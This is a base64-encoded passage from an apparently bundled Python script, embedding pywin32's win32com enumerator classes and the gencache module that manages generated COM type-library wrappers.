hdCBhbHRob3VnaCByYW5kb21cbiAgICBhY2Nlc3MgaXMgc3VwcG9ydGVkLCB0aGUgdW5kZXJseWluZyBvYmplY3QgaXMgc3RpbGwgYW4gZW51bWVyYXRvciwgc29cbiAgICB0aGlzIHdpbGwgZm9yY2UgbWFueSByZXNldC1hbmQtc2VlayBvcGVyYXRpb25zIHRvIGZpbmQgdGhlIHJlcXVlc3RlZCBpbmRleC5cblxuICAgICIiIlxuXG4gICAgZGVmIF9faW5pdF9fKHNlbGYsIGVudW0pOlxuICAgICAgICBzZWxmLl9vbGVvYmpfID0gZW51bSAgIyBhIFB5SUVudW1WQVJJQU5UXG4gICAgICAgIHNlbGYuaW5kZXggPSAtMVxuXG4gICAgZGVmIF9fZ2V0aXRlbV9fKHNlbGYsIGluZGV4KTpcbiAgICAgICAgcmV0dXJuIHNlbGYuX19HZXRJbmRleChpbmRleClcblxuICAgIGRlZiBfX2NhbGxfXyhzZWxmLCBpbmRleCk6XG4gICAgICAgIHJldHVybiBzZWxmLl9fR2V0SW5kZXgoaW5kZXgpXG5cbiAgICBkZWYgX19HZXRJbmRleChzZWxmLCBpbmRleCk6XG4gICAgICAgIGlmIHR5cGUoaW5kZXgpICE9IHR5cGUoMCk6XG4gICAgICAgICAgICByYWlzZSBUeXBlRXJyb3IoIk9ubHkgaW50ZWdlciBpbmRleGVzIGFyZSBzdXBwb3J0ZWQgZm9yIGVudW1lcmF0b3JzIilcbiAgICAgICAgIyBOT1RFXG4gICAgICAgICMgSW4gdGhpcyBjb250ZXh0LCBzZWxmLmluZGV4IGlzIHVzZXJzIHB1cmVseSBhcyBhIGZsYWcgdG8gc2F5XG4gICAgICAgICMgImFtIEkgc3RpbGwgaW4gc2VxdWVuY2UiLiAgVGhlIHVzZXIgbWF5IGNhbGwgTmV4dCgpIG9yIFJlc2V0KCkgaWYgdGhleVxuICAgICAgICAjIHNvIGNob29zZSwgaW4gd2hpY2ggY2FzZSBzZWxmLmluZGV4IHdpbGwgbm90IGJlIGNvcnJlY3QgKGFsdGhvdWdoIHdlXG4gICAgICAgICMgc3RpbGwgd2FudCB0byBzdGF5IGluIHNlcXVlbmNlKVxuICAgICAgICBpZiBpbmRleCAhPSBzZWxmLmluZGV4ICsgMTpcbiAgICAgICAgICAgICMgSW5kZXggcmVxdWVzdGVkIG91dCBvZiBzZXF1ZW5jZS5cbiAgICAgICAgICAgIHNlbGYuX29sZW9ial8uUmVzZXQoKVxuICAgICAgICAgICAgaWYgaW5kZXg6XG4gICAgICAgICAgICAgICAgc2VsZi5fb2xlb2JqXy5Ta2lwKFxuICAgICAgICAgICAgICAgICAgICBpbmRleFxuICAgICAgICAgICAgICAgICkgICMgaWYgYXNrZWQgZm9yIGl0ZW0gMSwgbXVzdCBza2lwIDEsIFB5dGhvbiBhbHdheXMgemVybyBiYXNlZC5cbiAgICAgICAgc2VsZi5pbmRleCA9IGluZGV4XG4gICAgICAgIHJlc3VsdCA9IHNlbGYuX29sZW9ial8uTmV4dCgxKVxuICAgICAgICBpZiBsZW4ocmVzdWx0KTpcbiAgICAgICAgICAgIHJldHVybiBzZWxmLl9tYWtlX3JldHZhbF8ocmVzdWx0WzBdKVxuICAgICAgICByYWlzZSBJbmRleEVycm9yKCJsaXN0IGluZGV4IG91dCBvZiByYW5nZSIpXG5cbiAgICBkZWYgTmV4dChzZWxmLCBjb3VudD0xKTpcbiAgICAgICAgcmV0ID0gc2VsZi5fb2xlb2JqXy5OZXh0KGNvdW50KVxuICAgICAgICByZWFsUmV0cyA9IFtdXG4gICAgICAgIGZvciByIGluIHJldDpcbiAgICAgICAgICAgIHJlYWxSZXRzLmFwcGVuZChzZWxmLl9tYWtlX3JldHZhbF8ocikpXG4gICAgICAgIHJldHVybiB0dXBsZShyZWFsUmV0cykgICMgQ29udmVydCBiYWNrIHRvIHR1cGxlLlxuXG4gICAgZGVmIFJlc2V0KHNlbGYpOlxuICAgICAgICByZXR1cm4gc2VsZi5fb2xlb2JqXy5SZXNldCgpXG5cbiAgICBkZWYgQ2xvbmUoc2VsZik6XG4gICAgICAgIHJldHVybiBzZWxmLl9fY2xhc3NfXyhzZWxmLl9vbGVvYmpfLkNsb25lKCksIHNlbGYucmVzdWx0Q0xTSUQpXG5cbiAgICBkZWYgX21ha2VfcmV0dmFsXyhzZWxmLCByZXN1bHQpOlxuICAgICAgICByZXR1cm4gcmVzdWx0XG5cblxuY2xhc3MgRW51bVZBUklBTlQoRW51bWVyYXRvcik6XG4gICAgZGVmIF9faW5pdF9fKHNlbGYsIGVudW0sIHJlc3VsdENMU0lEPU5vbmUpOlxuICAgICAgICBzZWxmLnJlc3VsdENMU0lEID0gcmVzdWx0Q0xTSURcbiAgICAgICAgRW51bWVyYXRvci5fX2luaXRfXyhzZWxmLCBlbnVtKVxuXG4gICAgZGVmIF9tYWtlX3JldHZhbF8oc2VsZiwgcmVzdWx0KTpcbiAgICAgICAgcmV0dXJuIF9nZXRfZ29vZF9vYmplY3RfKHJlc3VsdCwgcmVzdWx0Q0xTSUQ9c2VsZi5yZXN1bHRDTFNJRClcblxuXG5jbGFzcyBJdGVyYXRvcjpcbiAgICBkZWYgX19pbml0X18oc2VsZiwgZW51bSwgcmVzdWx0Q0xTSUQ9Tm9uZSk6XG4gICAgICAgIHNlbGYucmVzdWx0Q0xTSUQgPSByZXN1bHRDTFNJRFxuICAgICAgICBzZWxmLl9pdGVyXyA9IGl0ZXIoZW51bS5RdWVyeUludGVyZmFjZShweXRob25jb20uSUlEX0lFbnVtVkFSSUFOVCkpXG5cbiAgICBkZWYgX19pdGVyX18oc2VsZik6XG4gICAgICAgIHJldHVybiBzZWxmXG5cbiAgICBkZWYgX19uZXh0X18oc2VsZik6XG4gICAgICAgIHJldHVybiBfZ2V0X2dvb2Rfb2JqZWN0XyhuZXh0KHNlbGYuX2l0ZXJfKSwgcmVzdWx0Q0xTSUQ9c2VsZi5yZXN1bHRDTFNJRClcbicpCiAgICBfX3N0aWNreXRhcGVfd3JpdGVfbW9kdWxlKCd3aW4zMmNvbS9jbGllbnQvZ2VuY2FjaGUucHknLCBiJyIiIk1hbmFnZXMgdGhlIGNhY2hlIG9mIGdlbmVyYXRlZCBQeXRob24gY29kZS5cblxuRGVzY3JpcHRpb25cbiAgVGhpcyBmaWxlIG1hbmFnZXMgdGhlIGNhY2hlIG9mIGdlbmVyYXRlZCBQeXRob24gY29kZS4gIFdoZW4gcnVuIGZyb20gdGhlXG4gIGNvbW1hbmQgbGluZSwgaXQgYWxzbyBwcm92aWRlcyBhIG51bWJlciBvZiBvcHRpb25zIGZvciBtYW5hZ2luZyB0aGF0IGNhY2hlLlxuXG5JbXBsZW1lbnRhdGlvblxuICBFYWNoIHR5cGVsaWIgaXMgZ2VuZXJhdGVkIGludG8gYSBmaWxlbmFtZSBvZiBmb3JtYXQgIntndWlkfXh7bGNpZH14e21ham9yfXh7bWlub3J9LnB5IlxuXG4gIEFuIGV4dGVybmFsIHBlcnNpc3RhbnQgZGljdGlvbmFyeSBtYXBzIGZyb20gYWxsIGtub3duIElJRHMgaW4gYWxsIGtub3duIHR5cGUgbGlicmFyaWVzXG4gIHRvIHRoZSB0eXBlIGxpYnJhcnkgaXRzZWxmLlxuXG4gIFRodXMsIHdoZW5ldmVyIFB5dGhvbiBjb2RlIGtub3dzIHRoZSBJSUQgb2YgYW4gb2JqZWN0LCBpdCBjYW4gZmluZCB0aGUgSUlELCBMQ0lEIGFuZCB2ZXJzaW9uIG9mXG4gIHRoZSB0eXBlIGxpYnJhcnkgd2hpY2ggc3VwcG9ydHMgaXQuICBHaXZlbiB0aGlzIGluZm9ybWF0aW9uLCBpdCBjYW4gZmluZCB0aGUgUHl0aG9uIG1vZHVsZVxuICB3aXRoIHRoZSBzdXBwb3J0LlxuXG4gIElmIG5lY2Vzc2FyeSwgdGhpcyBzdXBwb3J0IGNhbiBiZSBnZW5lcmF0ZWQgb24gdGhlIGZseS5cblxuSGFja3MsIHRvIGRvLCBldGNcbiAgQ3VycmVudGx5IGp1c3QgdXNlcyBhIHBpY2tsZWQgZGljdGlvbmFyeSwgYnV0IHNob3VsZCB1c2VkIHNvbWUgc29ydCBvZiBpbmRleGVkIGZpbGUuXG4gIE1heWJlIGFuIE9MRTIgY29tcG91bmQgZmlsZSwgb3IgYSBic2RkYiBmaWxlP1xuIiIiXG5pbXBvcnQgcHl3aW50eXBlcywgb3MsIHN5c1xuaW1wb3J0IHB5dGhvbmNvbVxuaW1wb3J0IHdpbjMyY29tLCB3aW4zMmNvbS5jbGllbnRcbmltcG9ydCBnbG9iXG5pbXBvcnQgdHJhY2ViYWNrXG5mcm9tIC4gaW1wb3J0IENMU0lEVG9DbGFzc1xuaW1wb3J0IG9wZXJhdG9yXG5mcm9tIGltcG9ydGxpYiBpbXBvcnQgcmVsb2FkXG5cbmJGb3JEZW1hbmREZWZhdWx0ID0gMCAgIyBEZWZhdWx0IHZhbHVlIG9mIGJGb3JEZW1hbmQgLSB0b2dnbGUgdGhpcyB0byBjaGFuZ2UgdGhlIHdvcmxkIC0gc2VlIGFsc28gbWFrZXB5LnB5XG5cbiMgVGhlIGdsb2JhbCBkaWN0aW9uYXJ5XG5jbHNpZFRvVHlwZWxpYiA9IHt9XG5cbiMgSWYgd2UgaGF2ZSBhIGRpZmZlcmVudCB2ZXJzaW9uIG9mIHRoZSB0eXBlbGliIGdlbmVyYXRlZCwgdGhpc1xuIyBtYXBzIHRoZSAicmVxdWVzdGVkIHZlcnNpb24iIHRvIHRoZSAiZ2VuZXJhdGVkIHZlcnNpb24iLlxudmVyc2lvblJlZGlyZWN0TWFwID0ge31cblxuIyBUaGVyZSBpcyBubyByZWFzb24gd2UgKm11c3QqIGJlIHJlYWRvbmx5IGluIGEgLnppcCwgYnV0IHdlIGFyZSBub3csXG4jIFJhdGhlciB0aGFuIGNoZWNrIGZvciAiLnppcCIgb3Igb3RoZXIgdHJpY2tzLCBQRVAzMDIgZGVmaW5lc1xuIyBhICJfX2xvYWRlcl9fIiBhdHRyaWJ1dGUsIHNvIHdlIHVzZSB0aGF0LlxuIyAoTGF0ZXIsIGl0IG1heSBiZWNvbWUgbmVjZXNzYXJ5IHRvIGNoZWNrIGlmIHRoZSBfX2xvYWRlcl9fIGNhbiB1cGRhdGUgZmlsZXMsXG4jIGFzIGEgLnppcCBsb2FkZXIgcG90ZW50aWFsbHkgY291bGQgLSBidXQgcHVudCBhbGwgdGhhdCB1bnRpbCBhIG5lZWQgYXJpc2VzKVxuaXNfcmVhZG9ubHkgPSBpc196aXAgPSBoYXNhdHRyKHdpbjMyY29tLCAiX19sb2FkZXJfXyIpIGFuZCBoYXNhdHRyKFxuICAgIHdpbjMyY29tLl9fbG9hZGVyX18sICJhcmNoaXZlIlxuKVxuXG4jIEEgZGljdGlvbmFyeSBvZiBJVHlwZUxpYnJhcnkgb2JqZWN0cyBmb3IgZGVtYW5kIGdlbmVyYXRpb24gZXhwbGljaXRseSBoYW5kZWQgdG8gdXNcbiMgS2V5ZWQgYnkgdXN1YWwgY2xzaWQsIGxjaWQsIG1ham9yLCBtaW5vclxuZGVtYW5kR2VuZXJhdGVkVHlwZUxpYnJhcmllcyA9IHt9XG5cbmltcG9ydCBwaWNrbGUgYXMgcGlja2xlXG5cblxuZGVmIF9faW5pdF9fKCk6XG4gICAgIyBJbml0aWFsaXplIHRoZSBtb2R1bGUuICBDYWxsZWQgb25jZSBleHBsaWNpdGx5IGF0IG1vZHVsZSBpbXBvcnQgYmVsb3cuXG4gICAgdHJ5OlxuICAgICAgICBfTG9hZERpY3RzKClcbiAgICBleGNlcHQgSU9FcnJvcjpcbiAgICAgICAgUmVidWlsZCgpXG5cblxucGlja2xlVmVyc2lvbiA9IDFcblxuXG5kZWYgX1NhdmVEaWN0cygpOlxuICAgIGlmIGlzX3JlYWRvbmx5OlxuICAgICAgICByYWlzZSBSdW50aW1lRXJyb3IoXG4gICAgICAgICAgICAiVHJ5aW5nIHRvIHdyaXRlIHRvIGEgcmVhZG9ubHkgZ2VuY2FjaGUgKFwnJXNcJykhIiAlIHdpbjMyY29tLl9fZ2VuX3BhdGhfX1xuICAgICAgICApXG4gICAgZiA9IG9wZW4ob3MucGF0aC5qb2luKEdldEdlbmVyYXRlUGF0aCgpLCAiZGljdHMuZGF0IiksICJ3YiIpXG4gICAgdHJ5OlxuICAgICAgICBwID0gcGlja2xlLlBpY2tsZXIoZilcbiAgICAgICAgcC5kdW1wKHBpY2tsZVZlcnNpb24pXG4gICAgICAgIHAuZHVtcChjbHNpZFRvVHlwZWxpYilcbiAgICBmaW5hbGx5OlxuICAgICAgICBmLmNsb3NlKClcblxuXG5kZWYgX0xvYWREaWN0cygpOlxuICAgICMgTG9hZCB0aGUgZGljdGlvbmFyeSBmcm9tIGEgLnppcCBmaWxlIGlmIHRoYXQgaXMgd2hlcmUgd2UgbGl2ZS5cbiAgICBpZiBpc196aXA6XG4gICAgICAgIGltcG9ydCBpbyBhcyBpb1xuXG4gICAgICAgIGxvYWRlciA9IHdpbjMyY29tLl9fbG9hZGVyX19cbiAgICAgICAgYXJjX3BhdGggPSBsb2FkZXIuYXJjaGl2ZVxuICAgICAgICBkaWN0c19wYXRoID0gb3MucGF0aC5qb2luKHdpbjMyY29tLl9fZ2VuX3BhdGhfXywgImRpY3RzLmRhdCIpXG4gICAgICAgIGlmIGRpY3RzX3BhdGguc3RhcnRzd2l0aChhcmNfcGF0aCk6XG4gICAgICAgICAgICBkaWN0c19wYXRoID0gZGljdHNfcGF0aFtsZW4oYXJjX3BhdGgpICsgMSA6XVxuICAgICAgICBlbHNlOlxuICAgICAgICAgICAgIyBIbS4gU2VlIGJlbG93LlxuICAgICAgICAgICAgcmV0dXJuXG4gICAgICAgIHRyeTpcbiAgICAgICAgICAgIGRhdGEgPSBsb2FkZXIuZ2V0X2RhdGEoZGljdHNfcGF0aClcbiAgICAgICAgZXhjZXB0IEF0dHJpYnV0ZUVycm9yOlxuICAgICAgICAgICAgIyBUaGUgX19sb2FkZXJfXyBoYXMgbm8gZ2V0X2RhdGEgbWV0aG9kLiAgU2VlIGJlbG93LlxuICAgICAgICAgICAgcmV0dXJuXG4gICAgICAgIGV4Y2VwdCBJT0Vycm9yOlxuICAgICAgICAgICAgIyBPdXIgZ2VuY2FjaGUgaXMgaW4gYSAuemlwIGZpbGUgKGFuZCBhbG1vc3QgY2VydGFpbmx5IHJlYWRvbmx5KVxuICAgICAgICAgICAgIyBidXQgbm8gZGljdHMgZmlsZS4gIFRoYXQgYWN0dWFsbHkgbmVlZG5cJ3QgYmUgZmF0YWwgZm9yIGEgZnJvemVuXG4gICAgICAgICAgICAjIGFwcGxpY2F0aW9uLiAgQXNzdW1pbmcgdGhleSBjYWxsICJFbnN1cmVNb2R1bGUiIHdpdGggdGhlIHNhbWVcbiAgICAgICAgICAgICMgdHlwZWxpYiBJRHMgdGhleSBoYXZlIGJlZW4gZnJvemVuIHdpdGgsIHRoYXQgRW5zdXJlTW9kdWxlIHdpbGxcbiAgICAgICAgICAgICMgY29ycmVjdGx5IHJlLWJ1aWxkIHRoZSBkaWN0cyBvbiB0aGUgZmx5LiAgSG93ZXZlciwgb2JqZWN0cyB0aGF0XG4gICAgICAgICAgICAjIHJlbHkgb24gdGhlIGdlbmNhY2hlIGJ1dCBoYXZlIG5vdCBkb25lIGFuIEVuc3VyZU1vZHVsZSB3aWxsXG4gICAgICAgICAgICAjIGZhaWwgKGJ1dCB0aGVpciBhcHBzIGFyZSBsaWtlbHkgdG8gZmFpbCBydW5uaW5nIGZyb20gc291cmNlXG4gICAgICAgICAgICAjIHdpdGggYSBjbGVhbiBnZW5jYWNoZSBhbnl3YXksIGFzIHRoZW4gdGhleSB3b3VsZCBiZSBnZXR0aW5nXG4gICAgICAgICAgICAjIER5bmFtaWMgb2JqZWN0cyB1bnRpbCB0aGUgY2FjaGUgaXMgYnVpbHQgLSBzbyB0aGUgYmVzdCBhbnN3ZXJcbiAgICAgICAgICAgICMgZm9yIHRoZXNlIGFwcHMgaXMgdG8gY2FsbCBFbnN1cmVNb2R1bGUsIHJhdGhlciB0aGFuIGZyZWV6aW5nXG4gICAgICAgICAgICAjIHRoZSBkaWN0KVxuICAgICAgICAgICAgcmV0dXJuXG4gICAgICAgIGYgPSBpby5CeXRlc0lPKGRhdGEpXG4gICAgZWxzZTpcbiAgICAgICAgIyBOT1RFOiBJT0Vycm9yIG9uIGZpbGUgb3BlbiBtdXN0IGJlIGNhdWdodCBieSBjYWxsZXIuXG4gICAgICAgIGYgPSBvcGVuKG9zLnBhdGguam9pbih3aW4zMmNvbS5fX2dlbl9wYXRoX18sICJkaWN0cy5kYXQiKSwgInJiIilcbiAgICB0cnk6XG4gICAgICAgIHAgPSBwaWNrbGUuVW5waWNrbGVyKGYpXG4gICAgICAgIHZlcnNpb24gPSBwLmxvYWQoKVxuICAgICAgICBnbG9iYWwgY2xzaWRUb1R5cGVsaWJcbiAgICAgICAgY2xzaWRUb1R5cGVsaWIgPSBwLmxvYWQoKVxuICAgICAgICB2ZXJzaW9uUmVkaXJlY3RNYXAuY2xlYXIoKVxuICAgIGZpbmFsbHk6XG4gICAgICAgIGYuY2xvc2UoKVxuXG5cbmRlZiBHZXRHZW5lcmF0ZWRGaWxlTmFtZShjbHNpZCwgbGNpZCwgbWFqb3IsIG1pbm9yKTpcbiAgICAiIiJHaXZlbiB0aGUgY2xzaWQsIGxjaWQsIG1ham9yIGFuZCAgbWlub3IgZm9yIGEgdHlwZSBsaWIsIHJldHVyblxuICAgIHRoZSBmaWxlIG5hbWUgKG5vIGV4dGVuc2lvbikgcHJvdmlkaW5nIHRoaXMgc3VwcG9ydC5cbiAgICAiIiJcbiAgICByZXR1cm4gc3RyKGNsc2lkKS51cHBlcigpWzE6LTFdICsgInglc3glc3glcyIgJSAobGNpZCwgbWFqb3IsIG1pbm9yKVxuXG5cbmRlZiBTcGxpdEdlbmVyYXRlZEZpbGVOYW1lKGZuYW1lKTpcbiAgICAiIiJSZXZlcnNlIG9mIEdldEdlbmVyYXRlZEZpbGVOYW1lKCkiIiJcbiAgICByZXR1cm4gdHVwbGUoZm5hbWUuc3BsaXQoIngiLCA0KSlcblxuXG5kZWYgR2V0R2VuZXJhdGVQYXRoKCk6XG4gICAgIiIiUmV0dXJucyB0aGUgbmFtZSBvZiB0aGUgcGF0aCB0byBnZW5lcmF0ZSB0by5cbiAgICBDaGVja3MgdGhlIGRpcmVjdG9yeSBpcyBPSy5cbiAgICAiIiJcbiAgICBhc3NlcnQgbm90IGlzX3JlYWRvbmx5LCAiV2h5IGRvIHlvdSB3YW50IHRoZSBnZW5wYXRoIGZvciBhIHJlYWRvbmx5IHN0b3JlPyJcbiAgICB0cnk6XG4gICAgICAgIG9zLm1ha2VkaXJzKHdpbjMyY29tLl9fZ2VuX3BhdGhfXylcbiAgICAgICAgIyBvcy5ta2Rpcih3aW4zMmNvbS5fX2dlbl9wYXRoX18pXG4gICAgZXhjZXB0IG9zLmVycm9yOlxuICAgICAgICBwYXNzXG4gICAgdHJ5OlxuICAgICAgICBmbmFtZSA9IG9zLnBhdGguam9pbih3aW4zMmNvbS5fX2dlbl9wYXRoX18sICJfX2luaXRfXy5weSIpXG4gICAgICAgIG9zLnN0YXQoZm5hbWUpXG4gICAgZXhjZXB0IG9zLmVycm9yOlxuICAgICAgICBmID0gb3BlbihmbmFtZSwgInciKVxuICAgICAgICBmLndyaXRlKFxuICAgICAgICAgICAgIiMgR2VuZXJhdGVkIGZpbGUgLSB0aGlzIGRpcmVjdG9yeSBtYXkgYmUgZGVsZXRlZCB0byByZXNldCB0aGUgQ09NIGNhY2hlLi4uXFxuIlxuICAgICAgICApXG4gICAgICAgIGYud3JpdGUoImltcG9ydCB3aW4zMmNvbVxcbiIpXG4gICAgICAgIGYud3JpdGUoXG4gICAgICAgICAgICAiaWYgX19wYXRoX19bOi0xXSAhPSB3aW4zMmNvbS5fX2dlbl9wYXRoX186IF9fcGF0aF9fLmFwcGVuZCh3aW4zMmNvbS5fX2dlbl9wYXRoX18pXFxuIlxuICAgICAgICApXG4gICAgICAgIGYuY2xvc2UoKVxuXG4gICAgcmV0dXJuIHdpbjMyY29tLl9fZ2VuX3BhdGhfX1xuXG5cbiNcbiMgVGhlIGhlbHBlcnMgZm9yIHdpbjMyY29tLmNsaWVudC5EaXNwYXRjaCBhbmQgT0NYIGNsaWVudHMuXG4jXG5kZWYgR2V0Q2xhc3NGb3JQcm9nSUQocHJvZ2lkKTpcbiAgICAiIiJHZXQgYSBQeXRob24gY2xhc3MgZm9yIGEgUHJvZ3JhbSBJRFxuXG4gICAgR2l2ZW4gYSBQcm9ncmFtIElELCByZXR1cm4gYSBQeXRob24gY2xhc3Mgd2hpY2ggd3JhcHMgdGhlIENPTSBvYmplY3RcblxuICAgIFJldHVybnMgdGhlIFB5dGhvbiBjbGFzcywgb3IgTm9uZSBpZiBubyBtb2R1bGUgaXMgYXZhaWxhYmxlLlxuXG4gICAgUGFyYW1zXG4gICAgcHJvZ2lkIC0tIEEgQ09NIFByb2dyYW1JRCBvciBJSUQgKGVnLCAiV29yZC5BcHBsaWNhdGlvbiIpXG4gICAgIiIiXG4gICAgY2xzaWQgPSBweXdpbnR5cGVzLklJRChwcm9naWQpICAjIFRoaXMgYXV0by1jb252ZXJ0cyBuYW1lZCB0byBJRHMuXG4gICAgcmV0dXJuIEdldENsYXNzRm9yQ0xTSUQoY2xzaWQpXG5cblxuZGVmIEdldENsYXNzRm9yQ0xTSUQoY2xzaWQpOlxuICAgICIiIkdldCBhIFB5dGhvbiBjbGFzcyBmb3IgYSBDTFNJRFxuXG4gICAgR2l2ZW4gYSBDTFNJRCwgcmV0dXJuIGEgUHl0aG9uIGNsYXNzIHdoaWNoIHdyYXBzIHRoZSBDT00gb2JqZWN0XG5cbiAgICBSZXR1cm5zIHRoZSBQeXRob24gY2xhc3MsIG9yIE5vbmUgaWYgbm8gbW9kdWxlIGlzIGF2YWlsYWJsZS5cblxuICAgIFBhcmFtc1xuICAgIGNsc2lkIC0tIEEgQ09NIENMU0lEIChvciBzdHJpbmcgcmVwciBvZiBvbmUpXG4gICAgIiIiXG4gICAgIyBmaXJzdCwgdGFrZSBhIHNob3J0LWN1dCAtIHdlIG1heSBhbHJlYWR5IGhhdmUgZ2VuZXJhdGVkIHN1cHBvcnQgcmVhZHktdG8tcm9sbC5cbiAgICBjbHNpZCA9IHN0cihjbHNpZClcbiAgICBpZiBDTFNJRFRvQ2xhc3MuSGFzQ2xhc3MoY2xzaWQpOlxuICAgICAgICByZXR1cm4gQ0xTSURUb0NsYXNzLkdldENsYXNzKGNsc2lkKVxuICAgIG1vZCA9IEdldE1vZHVsZUZvckNMU0lEKGNsc2lkKVxuICAgIGlmIG1vZCBpcyBOb25lOlxuICAgICAgICByZXR1cm4gTm9uZVxuICAgIHRyeTpcbiAgICAgICAgcmV0dXJuIENMU0lEVG9DbGFzcy5HZXRDbGFzcyhjbHNpZClcbiAgICBleGNlcHQgS2V5RXJyb3I6XG4gICAgICAgIHJldHVybiBOb25lXG5cblxuZGVmIEdldE1vZHVsZUZvclByb2dJRChwcm9naWQpOlxuICAgICIiIkdldCBhIFB5dGhvbiBtb2R1bGUgZm9yIGEgUHJvZ3JhbSBJRFxuXG4gICAgR2l2ZW4gYSBQcm9ncmFtIElELCByZXR1cm4gYSBQeXRob24gbW9kdWxlIHdoaWNoIGNvbnRhaW5zIHRoZVxuICAgIGNsYXNzIHdoaWNoIHdyYXBzIHRoZSBDT00gb2JqZWN0LlxuXG4gICAgUmV0dXJucyB0aGUgUHl0aG9uIG1vZHVsZSwgb3IgTm9uZSBpZiBubyBtb2R1bGUgaXMgYXZhaWxhYmxlLlxuXG4gICAgUGFyYW1zXG4gICAgcHJvZ2lkIC0tIEEgQ09NIFByb2dyYW1JRCBvciBJSUQgKGVnLCAiV29yZC5BcHBsaWNhdGlvbiIpXG4gICAgIiIiXG4gICAgdHJ5OlxuICAgICAgICBpaWQgPSBweXdpbnR5cGVzLklJRChwcm9naWQpXG4gICAgZXhjZXB0IHB5d2ludHlwZXMuY29tX2Vycm9yOlxuICAgICAgICByZXR1cm4gTm9uZVxuICAgIHJldHVybiBHZXRNb2R1bGVGb3JDTFNJRChpaWQpXG5cblxuZGVmIEdldE1vZHVsZUZvckNMU0lEKGNsc2lkKTpcbiAgICAiIiJHZXQgYSBQeXRob24gbW9kdWxlIGZvciBhIENMU0lEXG5cbiAgICBHaXZlbiBhIENMU0lELCByZXR1cm4gYSBQeXRob24gbW9kdWxlIHdoaWNoIGNvbnRhaW5zIHRoZVxuICAgIGNsYXNzIHdoaWNoIHdyYXBzIHRoZSBDT00gb2JqZWN0LlxuXG4gICAgUmV0dXJucyB0aGUgUHl0aG9uIG1vZHVsZSwgb3IgTm9uZSBpZiBubyBtb2R1bGUgaXMgYXZhaWxhYmxlLlxuXG4gICAgUGFyYW1zXG4gICAgcHJvZ2lkIC0tIEEgQ09NIENMU0lEIChpZSwgbm90IHRoZSBkZXNjcmlwdGlvbilcbiAgICAiIiJcbiAgICBjbHNpZF9zdHIgPSBzdHIoY2xzaWQpXG4gICAgdHJ5OlxuICAgICAgICB0eXBlbGliQ0xTSUQsIGxjaWQsIG1ham9yLCBtaW5vciA9IGNsc2lkVG9UeXBlbGliW2Nsc2lkX3N0cl1cbiAgICBleGNlcHQgS2V5RXJyb3I6XG4gICAgICAgIHJldHVybiBOb25lXG5cbiAgICB0cnk6XG4gICAgICAgIG1vZCA9IEdldE1vZHVsZUZvclR5cGVsaWIodHlwZWxpYkNMU0lELCBsY2lkLCBtYWpvciwgbWlub3IpXG4gICAgZXhjZXB0IEltcG9ydEVycm9yOlxuICAgICAgICBtb2QgPSBOb25lXG4gICAgaWYgbW9kIGlzIG5vdCBOb25lOlxuICAgICAgICBzdWJfbW9kID0gbW9kLkNMU0lEVG9QYWNrYWdlTWFwLmdldChjbHNpZF9zdHIpXG4gICAgICAgIGlmIHN1Yl9tb2QgaXMgTm9uZTpcbiAgICAgICAgICAgIHN1Yl9tb2QgPSBtb2QuVlRhYmxlc1RvUGFja2FnZU1hcC5nZXQoY2xzaWRfc3RyKVxuICAgICAgICBpZiBzdWJfbW9kIGlzIG5vdCBOb25lOlxuICAgICAgICAgICAgc3ViX21vZF9uYW1lID0gbW9kLl9fbmFtZV9fICsgIi4iICsgc3ViX21vZFxuICAgICAgICAgICAgdHJ5OlxuICAgICAgICAgICAgICAgIF9faW1wb3J0X18oc3ViX21vZF9uYW1lKVxuICAgICAgICAgICAgZXhjZXB0IEltcG9ydEVycm9yOlxuICAgICAgICAgICAgICAgIGluZm8gPSB0eXBlbGliQ0xTSUQsIGxjaWQsIG1ham9yLCBtaW5vclxuICAgICAgICAgICAgICAgICMgRm9yY2UgdGhlIGdlbmVyYXRpb24uICBJZiB0aGlzIHR5cGVsaWJyYXJ5IGhhcyBleHBsaWNpdGx5IGJlZW4gYWRkZWQsXG4gICAgICAgICAgICAgICAgIyB1c2UgaXQgKGl0IG1heSBub3QgYmUgcmVnaXN0ZXJlZCwgY2F1c2luZyBhIGxvb2t1cCBieSBjbHNpZCB0byBmYWlsKVxuICAgICAgICAgICAgICAgIGlmIGluZm8gaW4gZGVtYW5kR2VuZXJhdGVkVHlwZUxpYnJhcmllczpcbiAgICAgICAgICAgICAgICAgICAgaW5mbyA9IGRlbWFuZEdlbmVyYXRlZFR5cGVMaWJyYXJpZXNbaW5mb11cbiAgICAgICAgICAgICAgICBmcm9tIC4gaW1wb3J0IG1ha2VweVxuXG4gICAgICAgICAgICAgICAgbWFrZXB5LkdlbmVyYXRlQ2hpbGRGcm9tVHlwZUxpYlNwZWMoc3ViX21vZCwgaW5mbylcbiAgICAgICAgICAgICAgICAjIEdlbmVyYXRlIGRvZXMgYW4gaW1wb3J0Li4uXG4gICAgICAgICAgICBtb2QgPSBzeXMubW9kdWxlc1tzdWJfbW9kX25hbWVdXG4gICAgcmV0dXJuIG1vZFxuXG5cbmRlZiBHZXRNb2R1bGVGb3JUeXBlbGliKHR5cGVsaWJDTFNJRCwgbGNpZCwgbWFqb3IsIG1pbm9yKTpcbiAgICAiIiJHZXQgYSBQeXRob24gbW9kdWxlIGZvciBhIHR5cGUgbGlicmFyeSBJRFxuXG4gICAgR2l2ZW4gdGhlIENMU0lEIG9mIGEgdHlwZWxpYnJhcnksIHJldHVybiBhbiBpbXBvcnRlZCBQeXRob24gbW9kdWxlLFxuICAgIGVsc2UgTm9uZVxuXG4gICAgUGFyYW1zXG4gICAgdHlwZWxpYkNMU0lEIC0tIElJRCBvZiB0aGUgdHlwZSBsaWJyYXJ5LlxuICAgIG1ham9yIC0tIEludGVnZXIgbWFqb3IgdmVyc2lvbi5cbiAgICBtaW5vciAtLSBJbnRlZ2VyIG1pbm9yIHZlcnNpb25cbiAgICBsY2lkIC0tIEludGVnZXIgTENJRCBmb3IgdGhlIGxpYnJhcnkuXG4gICAgIiIiXG4gICAgbW9kTmFtZSA9IEdldEdlbmVyYXRlZEZpbGVOYW1lKHR5cGVsaWJDTFNJRCwgbGNpZCwgbWFqb3IsIG1pbm9yKVxuICAgIG1vZCA9IF9HZXRNb2R1bGUobW9kTmFtZSlcbiAgICAjIElmIHRoZSBpbXBvcnQgd29ya2VkLCBpdCBkb2VzblwndCBtZWFuIHdlIGhhdmUgYWN0dWFsbHkgYWRkZWQgdGhpc1xuICAgICMgbW9kdWxlIHRvIG91ciBjYWNoZSB0aG91Z2ggLSBjaGVjayB0aGF0IGhlcmUuXG4gICAgaWYgIl9pbl9nZW5jYWNoZV8iIG5vdCBpbiBtb2QuX19kaWN0X186XG4gICAgICAgIEFkZ